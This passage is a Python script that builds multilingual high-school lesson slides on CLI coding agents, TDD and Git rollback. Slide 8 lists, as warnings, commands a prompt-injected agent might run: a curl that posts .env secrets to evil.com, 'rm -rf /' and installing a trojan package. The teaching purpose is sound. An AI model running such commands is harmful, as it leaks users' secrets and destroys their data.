#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
scripts/build_10_11_w12_l32.py — Builder for 10–11th Grade, Week 12, Lesson 32

Mavzu: Avtonom Kod Yozuvchi Agentlar va CLI Vositalari: OpenCode, Claude Code va TDD Refaktoring
Format: Juftlik Dars (80 daqiqa), 14 slayd
Kohorta: 10-11-sinf (Senior AI & Enterprise Cybersecurity Track)
"""

import os
import sys
import json
import re

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
DEST_DIR = os.path.join(REPO_ROOT, "classes", "10-11-sinf", "12-hafta", "32-dars-avtonom-cli-agentlar-va-opencode")

os.makedirs(DEST_DIR, exist_ok=True)
os.makedirs(os.path.join(DEST_DIR, "simulator"), exist_ok=True)

# -----------------------------------------------------------------------------
# 1. SLIDES HTML (14 Slides for 80-min Double Block)
# -----------------------------------------------------------------------------
SLIDES_HTML = """
  <!-- SLIDE 1: TITUL -->
  <section class="slide is-on" data-phase="Kirish|Введение|Intro" data-time="00:00–05:00" data-slide-index="0">
    <div class="eyebrow"><span class="t" data-ru="10–11-КЛАСС · 12-Я НЕДЕЛЯ · УРОК 32" data-en="GRADES 10–11 · WEEK 12 · LESSON 32">10–11-SINF · 12-HAFTA · 32-DARS</span></div>
    <h1 class="display" data-ru="Автономные Код-Агенты и CLI-Инструменты: OpenCode, Claude Code и TDD" data-en="Autonomous Coding Agents & CLI Tools: OpenCode, Claude Code & TDD">Avtonom Kod Yozuvchi Agentlar va CLI Vositalari: OpenCode, Claude Code va TDD</h1>
    <p class="lede" data-ru="Революция Terminal-First агентов в разработке ПО: переход от чат-ботов к полноправным консольным инженерам (OpenCode, Claude Code, Aider), цикл Test-Driven Development (TDD), многофайловое редактирование и безопасный откат через Git." data-en="The Terminal-First AI agent revolution in software engineering: shifting beyond passive chat windows to autonomous CLI engines (OpenCode, Claude Code), Test-Driven Development (TDD) validation loops, multi-file AST refactoring, and Git checkpoints.">Dasturiy injiniringda Terminal-First agentlar inqilobi: passiv chat oynasidan mustaqil konsol muhandislariga (OpenCode, Claude Code) o'tish, Test-Driven Development (TDD) tsikli, ko'p faylli refaktoring va Git orqali xavfsiz nazorat.</p>
    <div class="hero-split">
      <div class="box">
        <div class="tag" data-ru="Формат урока" data-en="Lesson Format">80 daqiqalik Juftlik Dars</div>
        <h3 data-ru="Terminal-First Архитектура" data-en="Terminal-First Architecture">CLI Muhandisligi</h3>
        <p data-ru="Почему автономные консольные агенты эффективнее расширений VS Code и как они исполняют bash-команды." data-en="Why standalone CLI coding agents outperform simple IDE chat plugins and how they execute shell commands.">Nega mustaqil CLI agentlari oddiy IDE chatlaridan kuchliroq ekani va ularning terminaldagi bash boshqaruv mexanizmi.</p>
      </div>
      <div class="box">
        <div class="tag" data-ru="Ожидаемый результат" data-en="Deliverable">OpenCode Studio</div>
        <h3 data-ru="Автономный TDD Цикл" data-en="Autonomous TDD Loop">O'zini Tekshiruvchi Kod</h3>
        <p data-ru="Каждый ученик освоит агентную разработку: написание падающего теста, реализация кода агентом и 100% зеленый билд." data-en="Each student masters agentic TDD: formulating failing tests, delegating implementation to agent, and reaching green test suites.">Har bir o'quvchi agentik TDD uslubini egallaydi: qizil test yozish, agent orqali kodni to'ldirish va 100% yashil testlarga erishish.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 2: MANDATORY HW REVIEW -->
  <section class="slide" data-phase="Tahlil|Разбор|Review" data-time="05:00–13:00" data-slide-index="1">
    <div class="eyebrow"><span class="t" data-ru="АНАЛИЗ ДОМАШНЕГО ЗАДАНИЯ 31-УРОКА" data-en="LESSON 31 HOMEWORK REVIEW">31-DARS UY VAZIFASI TAHLILI</span></div>
    <h2 data-ru="Разбор 31-урока: Ошибки Масштабирования Координат в Computer-Use" data-en="Lesson 31 Review: Coordinate Scaling Pitfalls in Computer-Use">31-dars Tahlili: Computer-Use Koordinatalarini O'tkazishdagi Xatolar</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Типичная Ошибка (Pitfall)" data-en="Common Pitfall">Keng Tarqalgan Xato (Pitfall)</div>
        <h3 data-ru="Клик без учета HiDPI / Retina масштаба" data-en="Unscaled Coordinate Blind Click">Retina masshtabini hisobga olmasdan bosish</h3>
        <p data-ru="Модель возвращает координаты в сетке 1024×768. Если передать их напрямую в pyautogui.click(x, y) на 4K или Retina экране (2560×1600), курсор промахивается на 1,000+ пикселей!" data-en="The vision model returns [x, y] inside its normalized 1024×768 frame. Passing these raw coordinates to 4K/Retina displays misses the target button by 1,000+ physical pixels!">Model koordinatalarni 1024×768 masshtabda qaytaradi. Agar uni to'g'ridan-to'g'ri 4K yoki Retina ekranga uzatsangiz, sichqoncha nishondan 1,000 piksel chetga adashib ketadi!</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#ef4444;">// XATO: Xom API koordinatalarini to'g'ridan-to'g'ri ishlatish</span>
pyautogui.click(api_x, api_y); <span style="color:#ef4444;">// 1,000 piksel xato!</span>
        </div>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Золотой Стандарт" data-en="Golden Standard">Oltin Standart (Best Practice)</div>
        <h3 data-ru="Коэффициент Масштабирования (Scale Factor)" data-en="Mathematical Scale Translation">Masshtab Koeffitsienti orqali Aniq O'tkazish</h3>
        <p data-ru="Обязательный расчет scaleX = physW / apiW и scaleY = physH / apiH с округлением round() гарантирует идеальное попадание в центр кнопки с точностью до пикселя." data-en="Computing scaleX = physW / apiW and scaleY = physH / apiH with round() ensures pixel-perfect cursor grounding on physical targets.">scaleX = physW / apiW va scaleY = physH / apiH koeffitsientlarini hisoblab, round() bilan yaxlitlash nishon markaziga 1 pikselgacha aniqlikda tushishni kafolatlaydi.</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#22c55e;">// TO'G'RI: Masshtab hisoblangan drayver</span>
const realX = Math.round(apiX * (physW / apiW));
const realY = Math.round(apiY * (physH / apiH));
pyautogui.click(realX, realY); <span style="color:#22c55e;">// 100% aniq nishon!</span>
        </div>
      </div>
    </div>
    <div class="grid-2" style="margin-top:14px;">
      <div class="box">
        <span class="badge" data-ru="Блиц-вопрос (30 сек)" data-en="Blitz Question (30s)">Blitz Savol</span>
        <p style="margin-top:4px; font-size:13px;" data-ru="Почему для написания сложных программ (1,000+ строк кода) скриншоты Computer-Use не подходят и нужен прямой доступ к файлам?" data-en="Why is Computer-Use visual clicking ineffective for heavy software development, requiring direct filesystem access?">Nega katta dasturlar yozishda ekran skrinshotlariga qarab sichqoncha bilan bosish yetarli emas va fayllar tizimiga bevosita kirish kerak?</p>
      </div>
      <div class="box">
        <span class="badge" data-ru="Мост к теме" data-en="Bridge to Today">Bugungi Mavzuga Ko'prik</span>
        <p style="margin-top:4px; font-size:13px;" data-ru="Скриншот не видит синтаксис AST, не запустит тесты в терминале и не сделает Git commit. Для реальной разработки нужны CLI-агенты: OpenCode и Claude Code!" data-en="Screenshots cannot parse AST trees, run test suites, or execute Git commits. Real programming demands CLI engines: OpenCode & Claude Code!">Skrinshot AST sintaksisini tahlil qila olmaydi, testlarni terminalda o'zi tekshirolmaydi va Git commit qila olmaydi. Haqiqiy dasturlash uchun terminal CLI agentlari kerak!</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 3: WHY CLI AGENTS BEAT IDE PLUGINS -->
  <section class="slide" data-phase="Konsept|Концепт|Concept" data-time="13:00–19:00" data-slide-index="2">
    <div class="eyebrow"><span class="t" data-ru="ЭВОЛЮЦИЯ ИИ-РАЗРАБОТКИ · ЭРА CLI" data-en="AI CODING EVOLUTION · THE CLI PARADIGM">AI DASTURLASH EVOLYUTSIYASI · CLI DAVRI</span></div>
    <h2 data-ru="Почему Инженеры Переходят из Чатов в Терминал (CLI)?" data-en="Why Elite Engineers Choose Terminal CLI Over Web Chats?">Nega Katta Muhandislar Chatdan Terminalga (CLI) O'tmoqda?</h2>
    <div class="grid-3">
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Поколение 1" data-en="Generation 1">Veb-Chatlar (ChatGPT)</div>
        <h3 data-ru="Копипаст-ад" data-en="Copy-Paste Hell">Nusxalash Azobi</h3>
        <p data-ru="Разработчик вручную копирует код в чат, ждет ответа, копирует обратно в редактор, правит пути и отступы. 80% времени тратится впустую." data-en="Engineers manually copy snippets back and forth into chat windows, reformatting indentation and paths. 80% wasted friction.">Dasturchi kodni chatga nusxalaydi, javobni kutadi, qaytarib faylga qo'yadi, xatolarni qo'lda tuzatadi. Vaqtning 80% i behuda ketadi.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(234,179,8,0.15); color:var(--warning);" data-ru="Поколение 2" data-en="Generation 2">IDE Plaginlari (Copilot)</div>
        <h3 data-ru="Автодополнение" data-en="Inline Autocomplete">Faqat Bir Qatorli Yordam</h3>
        <p data-ru="Подсказывает следующую строчку или правит один открытый файл. Не может самостоятельно запустить npm test, обновить БД и закоммитить." data-en="Suggests next lines or edits single open buffers. Cannot independently execute npm test, migrate DBs, or commit code.">Faqat bitta fayl ichida keyingi qatorni taxmin qiladi. O'zi mustaqil ravishda testlarni ishga tushirish yoki Git commit qilish huquqiga ega emas.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Поколение 3" data-en="Generation 3">Terminal CLI (OpenCode)</div>
        <h3 data-ru="Автономный Инженер" data-en="Autonomous Engineer">Mustaqil Konsol Agenti</h3>
        <p data-ru="Имеет полный доступ к файловой системе, терминалу, Git и тестам. Читает проект, правит 10 файлов, гоняет тесты и сам исправляет ошибки!" data-en="Full direct access to filesystem, shell, Git, and linters. Scans repo, edits 10 files, iterates tests until 100% green without human intervention.">Fayllar tizimi, terminal, Git va testlarga to'liq kirish huquqiga ega. Butun loyihani o'qiydi, 10 ta faylni birdan to'g'rilaydi va xatoni o'zi tuzatadi!</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 4: OPENCODE ARCHITECTURE -->
  <section class="slide" data-phase="Arxitektura|Архитектура|Architecture" data-time="19:00–25:00" data-slide-index="3">
    <div class="eyebrow"><span class="t" data-ru="АНАТОМИЯ OPENCODE · ИНСТРУМЕНТЫ АГЕНТА" data-en="OPENCODE ANATOMY · AGENT TOOLING">OPENCODE ARXITEKTURASI · AGENT QUROLLARI</span></div>
    <h2 data-ru="Анатомия OpenCode: Как CLI-Агент Управляет Кодом" data-en="Inside OpenCode: How the CLI Agent Drives Projects">OpenCode Anatomiyasi: CLI Agenti Loyihani Qanday Boshqaradi</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Набор Инструментов (Agent Toolset)" data-en="Core Agent Toolset">Agentning 5 Ta Asosiy Quroli:</h3>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="📂 <code>read_file(path)</code>: чтение содержимого любого файла в репозитории." data-en="📂 <code>read_file(path)</code>: reads raw content of any codebase file.">📂 <code>read_file(path)</code>: loyihadagi istalgan fayl tarkibini o'qish.</li>
          <li data-ru="✍️ <code>write_file / edit_file</code>: точечная замена блоков кода без перезаписи." data-en="✍️ <code>write_file / edit_file</code>: targeted surgical block replacements.">✍️ <code>edit_file</code>: butun faylni emas, aynan kerakli qatorlarni jarrohlikdek almashtirish.</li>
          <li data-ru="⚡ <code>run_command(cmd)</code>: исполнение bash-команд (npm test, build, lint)." data-en="⚡ <code>run_command(cmd)</code>: shell command execution (npm test, build).">⚡ <code>run_command(cmd)</code>: terminalda testlar va kompilyatsiyani yurgizish.</li>
          <li data-ru="🔍 <code>search_files(query)</code>: поиск по всей кодовой базе (grep/glob)." data-en="🔍 <code>search_files(query)</code>: fast regex scanning across all folders.">🔍 <code>search_files</code>: butun loyiha bo'ylab tezkor qidiruv.</li>
          <li data-ru="📜 <code>git_diff</code>: анализ изменений перед показом пользователю." data-en="📜 <code>git_diff</code>: inspecting working tree diffs before commit.">📜 <code>git_diff</code>: o'zgartirilgan qatorlarni nazorat qilish.</li>
        </ul>
      </div>
      <div class="card" style="display:flex; flex-direction:column; justify-content:center;">
        <div class="code-block" style="font-size:11px; line-height:1.6;">
[ Foydalanuvchi: "Auth tizimiga JWT qo'sh" ]
                │
                ▼
      [ OpenCode CLI Engine ]
                │
        ┌───────┴───────┐
        ▼               ▼
[ read_file(auth.js) ] [ npm install jsonwebtoken ]
        │               │
        └───────┬───────┘
                ▼
      [ edit_file(auth.js) ]
                │
                ▼ (Avtotest)
      [ run_command("npm test") ]
        │                 │
     (Muvaffaqiyat)     (Xato: Token expired)
        │                 │
        ▼                 └──► [ O'zi tuzatadi (Self-heal) ]
[ git commit -m "feat: jwt auth" ]
        </div>
      </div>
    </div>
  </section>

  <!-- SLIDE 5: TEST-DRIVEN DEVELOPMENT (TDD) LOOP -->
  <section class="slide" data-phase="Metodika|Методология|Methodology" data-time="25:00–31:00" data-slide-index="4">
    <div class="eyebrow"><span class="t" data-ru="МЕТОДОЛОГИЯ TDD · АВТОНОМНОЕ КАЧЕСТВО" data-en="TDD METHODOLOGY · AUTONOMOUS QUALITY">TDD METODIKASI · AVTONOM SIFAT NAZORATI</span></div>
    <h2 data-ru="Агентный TDD: Красный ➔ Зеленый ➔ Рефакторинг" data-en="Agentic TDD: Red ➔ Green ➔ Refactor Loop">Agentik TDD Tsikli: Qizil ➔ Yashil ➔ Refaktoring</h2>
    <div class="grid-3">
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="1. Фаза RED (Красный)" data-en="1. RED Phase">1. RED (Qizil Test)</div>
        <h3 data-ru="Падающий тест" data-en="Failing Test">Xato Beruvchi Test</h3>
        <p data-ru="Сначала пишется тест для функции, которой еще не существует. При запуске npm test выдает ошибку (RED). Это доказывает, что тест действительно работает!" data-en="Write a test asserting behavior for code that does not yet exist. npm test fails (RED). This proves the test is strictly valid!">Hali yozilmagan funksiya uchun qat'iy test yoziladi. npm test qizil xato beradi (RED). Bu testning soxta emasligini isbotlaydi!</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="2. Фаза GREEN (Зеленый)" data-en="2. GREEN Phase">2. GREEN (Yashil Yechim)</div>
        <h3 data-ru="Минимальный код" data-en="Minimal Implementation">Kodni Yozish</h3>
        <p data-ru="Агент пишет ровно столько кода, сколько нужно, чтобы тест прошел. Запуск npm test ➔ Все 100% тестов зеленые (GREEN)!" data-en="Agent writes just enough production code to satisfy the test specs. Re-running npm test turns everything GREEN!">Agent faqat testdan o'tish uchun zarur bo'lgan minimal kodni yozadi. npm test qayta tekshirib, yashil rangga o'tadi (GREEN)!</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="3. REFACTOR (Очистка)" data-en="3. REFACTOR Phase">3. REFACTOR (Tozalash)</div>
        <h3 data-ru="Чистый код" data-en="Code Polish">Arxitekturani Tozalash</h3>
        <p data-ru="Агент убирает дублирование, оптимизирует скорость и добавляет типы. Если тесты все еще зеленые — задача выполнена безупречно!" data-en="Agent removes duplicate logic, types variables, and polishes architecture. If tests stay green — release is safe!">Agent ortiqcha qatorlarni olib tashlaydi, kodni chiroyli qiladi. Testlar baribir yashilligicha qolsa — vazifa mukammal yakunlandi!</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 6: MULTI-FILE EDITING & CONTEXT GRAPH -->
  <section class="slide" data-phase="Muhandislik|Инженерия|Engineering" data-time="31:00–37:00" data-slide-index="5">
    <div class="eyebrow"><span class="t" data-ru="МНОГОФАЙЛОВЫЙ КОНТЕКСТ · СВЯЗНОСТЬ КОДА" data-en="MULTI-FILE REFACTORING · CONTEXT INTEGRITY">KO'P FAYLLI TAHRIRLASH · KONTEKST BUTUNLIGI</span></div>
    <h2 data-ru="Синхронное Изменение 5 Файлов Без Потери Связей" data-en="Synchronizing Edits Across 5 Files Without Breakage">Bir Vaqtda 5 Ta Faylni Xatolarsiz O'zgartirish</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Проблема поломки импортов" data-en="The Import Breakage Trap">Importlar Buzilishi Muammosi</h3>
        <p data-ru="Когда вы меняете название функции в math.js, ломаются 4 других файла, которые ее импортируют (app.js, test.js, index.js). Чат-боты забывают об этом и ломают билд." data-en="Renaming an export in math.js breaks all downstream consumers (app.js, test.js, index.js). Naive chatbots miss imports and break builds.">math.js dagi funksiya nomini o'zgartirganingizda, uni chaqirgan qolgan 4 ta fayl (app.js, test.js) buziladi. Oddiy chatlar buni unutib, loyihani ishlamay qolishiga sabab bo'ladi.</p>
        <div class="box" style="margin-top:12px;">
          <strong data-ru="Как решает OpenCode:" data-en="How OpenCode resolves it:">OpenCode buni qanday hal qiladi:</strong>
          <p style="font-size:12px; margin-top:4px;" data-ru="Агент находит все файлы через ripgrep/AST, обновляет импорты одновременно и запускает компилятор для проверки целостности типов." data-en="Agent scans references across all files, updates imports simultaneously, and invokes linters to verify cross-file integrity.">Agent barcha fayllarni skanerlaydi, importlarni bir vaqtda yangilaydi va TypeScript/ESLint orqali loyiha yaxlitligini tekshiradi.</p>
        </div>
      </div>
      <div class="card">
        <div class="code-block" style="font-size:11px; line-height:1.5;">
<span style="color:#64748b;">// 1. Fayl: src/services/payment.js (Eksport o'zgardi)</span>
export function processInvoice(amount) { ... }

<span style="color:#64748b;">// 2. Fayl: src/controllers/order.js (Avto-yangilandi)</span>
import { processInvoice } from '../services/payment.js';

<span style="color:#64748b;">// 3. Fayl: tests/payment.test.js (Test ham yangilandi)</span>
expect(processInvoice(500)).toBe(true);

<span style="color:#22c55e;">// Terminal tekshiruvi:</span>
$ npm run lint
✔ 0 errors, 0 warnings. Build passed!
        </div>
      </div>
    </div>
  </section>

  <!-- SLIDE 7: GIT CHECKPOINTS & ROLLBACK -->
  <section class="slide" data-phase="Xavfsizlik|Безопасность|Security" data-time="37:00–43:00" data-slide-index="6">
    <div class="eyebrow"><span class="t" data-ru="КОНТРОЛЬ ВЕРСИЙ · СТРАХОВКА ОТ ОШИБОК" data-en="VERSION CONTROL · ROLLBACK INSURANCE">GIT CHECKPOINTS · XATOLARDAN SUG'URTA</span></div>
    <h2 data-ru="Git как Спасательный Круг: Откат Неудачных Действий" data-en="Git as Safety Net: Rolling Back Erroneous Agent Edits">Git — Xaloskor Qalqon: Agent Xatosini Bir Zumda Qaytarish</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Риск" data-en="Risk">Gallyutsinatsiya Xavfi</div>
        <h3 data-ru="Агент сломал работающий код" data-en="Agent Broke Working Code">Agent Kodingizni Buzib Qo'ydi</h3>
        <p data-ru="Иногда ИИ заходит в тупик: начинает удалять нужные функции или бесконечно переписывать файл. Без контроля версий проект можно потерять." data-en="Occasionally agents hallucinate into loops, deleting working logic or butchering structure. Without Git, changes might be lost permanently.">Ba'zida AI adashadi: to'g'ri ishlab turgan kodni o'chirib yuborishi yoki chalkashtirishi mumkin. Git bo'lmasa, soatlab qilingan mehnat yo'qoladi.</p>
        <div class="box" style="margin-top:10px;">
          <strong data-ru="Золотое правило:" data-en="Golden Rule:">Oltin Qoida:</strong>
          <p style="font-size:12px; margin-top:4px;" data-ru="Перед запуском автономного агента ВСЕГДА делайте git commit или убедитесь, что рабочая ветка чиста (Clean Working Tree)." data-en="Always ensure a clean working tree or commit before letting autonomous agents touch files.">Agentga topshiriq berishdan oldin ALBATTA <code>git commit</code> qiling yoki ishchi papka toza ekaniga ishonch hosil qiling!</p>
        </div>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Решение" data-en="Remedy">3 Ta Tezkor Buyruq</div>
        <h3 data-ru="Мгновенный Откат" data-en="Instant Rollback">Orqaga Qaytish Buyruqlari</h3>
        <div class="code-block" style="font-size:11.5px; line-height:1.6; margin-top:10px;">
<span style="color:#64748b;"># 1. Agent nimalarni o'zgartirganini ko'rish</span>
git diff

<span style="color:#eab308;"># 2. Barcha o'zgarishlarni vaqtincha yashirish</span>
git stash

<span style="color:#ef4444;"># 3. Oxirgi toza commitga 1 soniyada qaytish (Hard Reset)</span>
git reset --hard HEAD
        </div>
        <p style="font-size:11px; margin-top:8px; color:var(--ink-secondary);" data-ru="Одна команда git reset --hard HEAD полностью нейтрализует любые ошибки агента за 0.1 секунды." data-en="A single git reset --hard HEAD wipes all agent mistakes in 0.1s, restoring pristine state.">Bitta <code>git reset --hard HEAD</code> buyrug'i agentning barcha xatolarini 0.1 soniyada bekor qilib, toza holatni qaytaradi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 8: CYBERSECURITY & SHELL GUARDRAILS -->
  <section class="slide" data-phase="Xavfsizlik|Безопасность|Security" data-time="43:00–48:00" data-slide-index="7">
    <div class="eyebrow"><span class="t" data-ru="КИБЕРБЕЗОПАСНОСТЬ · ЗАЩИТА ТЕРМИНАЛА" data-en="CYBERSECURITY · SHELL GUARDRAILS">KIBERXAVFSIZLIK · TERMINAL CHEKLOVLARI</span></div>
    <h2 data-ru="Опасные Команды: Блокировка RCE и Кражи .env Секретов" data-en="Dangerous Commands: Guarding Against RCE & Secret Leaks">Xavfli Buyruqlar: RCE va .env Parollarini Himoyalash</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Тайные утечки через команду bash" data-en="Covert Data Exfiltration via Shell">Terminal Orqali Sirli Hujumlar</h3>
        <p data-ru="Если агент заражен вредоносным промптом (Prompt Injection), он может попытаться выполнить в вашем терминале:" data-en="If an agent digests a prompt-injected repository, it may attempt dangerous shell calls:">Agar agent zararli prompt (Prompt Injection) ta'siriga tushsa, terminalda quyidagi xavfli buyruqlarni berishi mumkin:</p>
        <ul style="font-size:12px; line-height:1.7; margin-top:6px;">
          <li data-ru="❌ <code>curl -X POST evil.com --data @.env</code> (слив API ключей)" data-en="❌ <code>curl -X POST evil.com --data @.env</code> (leaking secret API keys)">❌ <code>curl https://evil.com --data @.env</code> (maxfiy parollarni o'g'irlash)</li>
          <li data-ru="❌ <code>rm -rf /</code> или удаление системных папок" data-en="❌ <code>rm -rf /</code> or deleting production directories">❌ <code>rm -rf /</code> yoki tizim fayllarini o'chirish</li>
          <li data-ru="❌ <code>npm install backdoor-trojan</code>" data-en="❌ <code>npm install backdoor-trojan</code>">❌ Noma'lum troyan paketlarni o'rnatish</li>
        </ul>
      </div>
      <div class="card">
        <h3 data-ru="Human-in-the-Loop (HITL) Подтверждение" data-en="Human-in-the-Loop Confirmation">Inson Tasdig'i (HITL Guard)</h3>
        <p data-ru="OpenCode и Claude Code по умолчанию требуют вашего нажатия [y/n] перед запуском любой команды в терминале:" data-en="Modern CLI engines strictly prompt [y/n] before executing shell commands:">OpenCode har qanday terminal buyrug'ini bajarishdan oldin sizdan tasdiq so'raydi [y/n]:</p>
        <div class="code-block" style="margin-top:10px; font-size:11px;">
<span style="color:#eab308;">[OpenCode]: Buyruqni bajarishga ruxsat berasizmi?</span>
$ npm test
<span style="color:#22c55e;">[y] Ha  |  [n] Yo'q  |  [a] Hammasiga ruxsat</span>
        </div>
        <p style="font-size:11px; margin-top:8px; color:var(--danger);" data-ru="Никогда не давайте флаг --dangerously-skip-permissions на незнакомых репозиториях!" data-en="Never enable --dangerously-skip-permissions on untrusted repositories!">Hech qachon begona loyihalarda barcha ruxsatlarni avtomatik ochib qo'ymang!</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 9: INTERACTIVE BLITZ QUIZ -->
  <section class="slide" data-phase="Viktorina|Викторина|Quiz" data-time="48:00–53:00" data-slide-index="8">
    <div class="eyebrow"><span class="t" data-ru="БЛИЦ-ПРОВЕРКА ЗНАНИЙ · 4 ВОПРОСА" data-en="KNOWLEDGE CHECK · 4 BLITZ QUESTIONS">BLITZ KIBER-TEST · 4 TA TEZKOR SAVOL</span></div>
    <h2 data-ru="Интерактивный Квиз: Проверь Свою Инженерную Интуицию" data-en="Interactive Quiz: Test Your Engineering Intuition">Interaktiv Quiz: Muhandislik Sezgisini Sinash</h2>
    <div class="grid-2">
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:var(--accent); color:#fff;">1</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="В чем главное преимущество CLI-агента (OpenCode) перед веб-чатом?" data-en="What is the prime advantage of CLI agents over web chats?">CLI agentining (OpenCode) veb-chatdan eng asosiy ustunligi nima?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) Красивее интерфейс | B) Прямой доступ к файлам, терминалу и тестам | C) Он бесплатный" data-en="A) Nicer UI | B) Direct access to filesystem, shell, and tests | C) Free">A) Chiroyliroq interfeys | B) Fayllar, terminal va testlarga to'g'ridan-to'g'ri kirish | C) Tekin</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: B (Автономное исполнение и самопроверка)" data-en="Answer: B (Autonomous execution & self-verification)">Javob: B (Avtonom kod yozish va testlar bilan o'zini tekshirish)</div>
      </div>
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:#a855f7; color:#fff;">2</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="Что означает фаза RED в цикле разработки TDD?" data-en="What does the RED phase signify in TDD?">TDD tsiklidagi RED (Qizil) bosqichi nimani bildiradi?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) Ошибка сервера | B) Написание падающего теста до написания кода | C) Зависание" data-en="A) Server crash | B) Writing a failing test before writing code | C) Freeze">A) Server qulashi | B) Kod yozishdan oldin xato beruvchi test yozish | C) Qotish</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: B (Доказательство того, что тест проверяет реальное поведение)" data-en="Answer: B (Proves the test asserts intended behavior)">Javob: B (Kod yozishdan oldin qizil test orqali talabni qat'iy belgilash)</div>
      </div>
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:var(--warning); color:#fff;">3</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="Какой командой Git можно мгновенно стереть все плохие изменения агента?" data-en="Which Git command instantly purges all erroneous agent modifications?">Agent buzib qo'ygan barcha xatolarni qaysi Git buyrug'i bilan bekor qilish mumkin?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) git commit | B) git push | C) git reset --hard HEAD" data-en="A) git commit | B) git push | C) git reset --hard HEAD">A) git commit | B) git push | C) git reset --hard HEAD</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: C (Полный возврат к чистому состоянию)" data-en="Answer: C (Hard reset back to clean commit state)">Javob: C (Oxirgi toza commitga qat'iy qaytish)</div>
      </div>
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:var(--danger); color:#fff;">4</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="Зачем нужен Human-in-the-Loop при выполнении команд bash?" data-en="Why is Human-in-the-Loop required for shell execution?">Bash buyruqlari bajarilishida nega Human-in-the-Loop (inson tasdig'i) kerak?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) Чтобы не удалить файлы и не слить .env пароли | B) Для скорости | C) Для дизайна" data-en="A) Prevent file loss and .env leaks | B) Speed | C) Styling">A) Fayllar o'chib ketmasligi va .env sirlari o'g'irlanmasligi uchun | B) Tezlik | C) Dizayn</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: A (Защита от деструктивных команд и утечек)" data-en="Answer: A (Defense against destructive commands & exfiltration)">Javob: A (Xavfli buyruqlar va parollar sizib chiqishini to'sish)</div>
      </div>
    </div>
  </section>

  <!-- SLIDE 10: AGENTS.MD & SYSTEM PROMPTING -->
  <section class="slide" data-phase="Standart|Стандарт|Standard" data-time="53:00–58:00" data-slide-index="9">
    <div class="eyebrow"><span class="t" data-ru="КОНСТИТУЦИЯ АГЕНТА · AGENTS.MD" data-en="AGENT CONSTITUTION · AGENTS.MD">AGENT KONSTITUTSIYASI · AGENTS.MD STANDARTI</span></div>
    <h2 data-ru="Как Управлять Агентом: Файлы AGENTS.md и Rules" data-en="Governing the Agent: AGENTS.md & Rules Files">Agentni Boshqarish: AGENTS.md va Qoidalar Fayli</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Зачем нужен AGENTS.md в корне проекта" data-en="Why AGENTS.md in Project Root Matters">Loyiha Ildizidagi AGENTS.md Nima Beradi?</h3>
        <p data-ru="OpenCode при запуске первым делом ищет файл AGENTS.md или .cursorrules. Это строгие законы проекта, которые агент обязан соблюдать:" data-en="OpenCode automatically ingests AGENTS.md upon boot. These are project laws the agent must respect:">OpenCode ishga tushganda birinchi bo'lib AGENTS.md faylini o'qiydi. Bu agent so'zsiz rioya qilishi shart bo'lgan temir qoidalardir:</p>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="📏 Стек: 'Используй только TypeScript и TailwindCSS'." data-en="📏 Stack: 'Enforce TypeScript & TailwindCSS'.">📏 Texnologiya: "Faqat ES Modules va toza funksiyalardan foydalan".</li>
          <li data-ru="🛡️ Запреты: 'Никогда не удаляй тесты и не меняй .env'." data-en="🛡️ Prohibitions: 'Never touch .env or delete tests'.">🛡️ Taqiqlar: "Hech qachon testlarni o'chirma va .env ga tegma".</li>
          <li data-ru="🧪 Тесты: 'Перед коммитом всегда запускай npm test'." data-en="🧪 Testing: 'Always execute npm test before commit'.">🧪 Sinov: "Har bir o'zgarishdan so'ng npm test ni yurgiz".</li>
        </ul>
      </div>
      <div class="card">
